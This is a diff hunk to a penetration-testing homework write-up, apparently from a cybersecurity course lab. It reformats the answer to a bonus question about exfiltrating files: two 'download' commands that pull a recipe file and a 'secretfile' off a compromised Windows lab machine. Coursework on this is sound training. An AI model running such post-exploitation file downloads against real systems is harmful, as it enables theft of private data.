@@ -74,9 +74,9 @@ Perform a service and version scan using Nmap to determine which services are up
 
 	Bonus: Run the command that exfiltrates the recipe*.txt file:
 
-		**Answer: download c:\\Users\\IEUser\\Documents\\Drinks.recipe.txt**
-		
-		**download c:\\Users\\IEUSER\\Documents\\user.secretfile.txt**
+	**Answer:** 	
+			**download c:\\Users\\IEUser\\Documents\\Drinks.recipe.txt**
+			**download c:\\Users\\IEUSER\\Documents\\user.secretfile.txt**
 	
 	![Image of bonus](https://github.com/bwilliams4428/Cybersecurity-Homework/blob/main/17-Penetration-II-Homework/images/q10.PNG)
 	![Image of bonus](https://github.com/bwilliams4428/Cybersecurity-Homework/blob/main/17-Penetration-II-Homework/images/q12.PNG)
